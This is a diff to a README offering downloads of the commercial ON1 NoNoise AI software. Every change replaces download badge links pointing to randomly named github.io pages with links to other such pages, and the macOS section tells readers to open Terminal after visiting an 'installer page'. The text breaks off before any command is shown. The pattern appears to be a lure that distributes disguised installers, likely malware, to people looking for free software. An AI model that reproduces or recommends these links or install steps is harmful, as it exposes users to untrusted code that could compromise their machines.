@@ -26,7 +26,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_ON1%20NoNoise%20AI-0078D4?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![Download](https://img.shields.io/badge/⬇_Download_ON1%20NoNoise%20AI-0078D4?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
 
 </div>
 
@@ -65,9 +65,9 @@ ON1 NoNoise AI is a standalone and plugin noise reduction tool powered by deep l
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
 
 </div>
 
@@ -80,7 +80,7 @@ ON1 NoNoise AI is a standalone and plugin noise reduction tool powered by deep l
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_ON1%20NoNoise%20AI-0078D4?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![Download](https://img.shields.io/badge/⬇_Download_ON1%20NoNoise%20AI-0078D4?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
 
 </div>
 
@@ -110,7 +110,7 @@ ON1 NoNoise AI is a standalone and plugin noise reduction tool powered by deep l
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
